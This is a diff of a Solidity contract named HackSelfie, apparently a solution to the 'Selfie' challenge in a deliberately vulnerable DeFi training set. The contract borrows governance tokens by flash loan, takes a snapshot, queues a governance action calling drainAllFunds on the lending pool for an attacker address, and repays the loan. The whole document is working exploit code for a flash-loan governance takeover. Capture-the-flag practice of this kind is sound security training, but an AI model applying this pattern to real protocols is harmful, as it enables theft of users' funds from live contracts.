@@ -1,22 +1,40 @@
 pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
+import "./SelfiePool.sol";
+import "./SimpleGovernance.sol";
+import "../DamnValuableTokenSnapshot.sol";
 import "hardhat/console.sol";
 
 contract HackSelfie {
-    ISelfiePool pool = ISelfiePool(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0);
-    ISimpleGovernance gov =
-        ISimpleGovernance(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
-    uint256 actionId;
+    ERC20Snapshot public token;
+    SelfiePool private immutable pool;
+    SimpleGovernance private immutable governance;
+    address payable attacker;
+    uint256 public actionId;
+
+    constructor(
+        address tokenAddress,
+        address poolAddress,
+        address governanceAddress,
+        address attackerAddress
+    ) {
+        token = ERC20Snapshot(tokenAddress);
+        pool = SelfiePool(poolAddress);
+        governance = SimpleGovernance(governanceAddress);
+        attacker = payable(attackerAddress);
+    }
 
     function callFlashLoan(uint256 amount) public {
         pool.flashLoan(amount);
-        gov.executeAction(actionId);
     }
 
-    function receiveTokens(address token, uint256 amount) public {
-        //ERC20Snapshot(token).snapshot();
+    function receiveTokens(address tokenAdd, uint256 amount) public {
+        DamnValuableTokenSnapshot govToken = DamnValuableTokenSnapshot(
+            tokenAdd
+        );
+        govToken.snapshot();
 
-        actionId = gov.queueAction(
+        actionId = governance.queueAction(
             address(pool),
             abi.encodeWithSignature(
                 "drainAllFunds(address)",
@@ -24,8 +42,7 @@ contract HackSelfie {
             ),
             0
         );
-        console.log("actionId", actionId);
-        ERC20Snapshot(token).transfer(address(pool), amount);
+        token.transfer(address(pool), amount);
     }
 }
 
